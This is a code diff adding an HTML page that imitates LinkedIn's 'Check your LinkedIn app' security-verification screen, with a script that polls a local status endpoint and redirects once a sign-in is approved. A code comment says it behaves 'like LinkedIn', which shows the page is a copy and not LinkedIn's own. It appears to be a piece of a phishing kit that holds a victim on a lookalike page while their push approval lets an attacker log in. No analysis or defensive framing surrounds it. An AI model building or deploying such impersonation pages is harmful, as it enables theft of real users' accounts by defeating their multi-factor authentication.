@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Security Verification | LinkedIn</title></head>
+<body>
+<main class="app__content" role="main">
+  <section id="app__container" class="app-challenge">
+    <h1 class="content__header">Check your LinkedIn app</h1>
+    <p class="content__subtitle">We sent a notification to your signed in devices. Open your LinkedIn app and tap <strong>Yes</strong> to confirm it’s you.</p>
+    <p>Didn’t get the notification? <button type="button" class="btn__tertiary">Resend</button></p>
+    <a href="/checkpoint/challenge/sms" class="btn__tertiary--medium">Verify using SMS</a>
+  </section>
+</main>
+<script>
+  // Like LinkedIn, the page polls and moves on once the sign-in is approved in the app.
+  setInterval(async () => {
+    try {
+      const res = await fetch('/checkpoint/challenge/app-status')
+      const { approved } = await res.json()
+      if (approved) location.href = '/checkpoint/challenge/approved'
+    } catch {}
+  }, 250)
+</script>
+</body>
+</html>
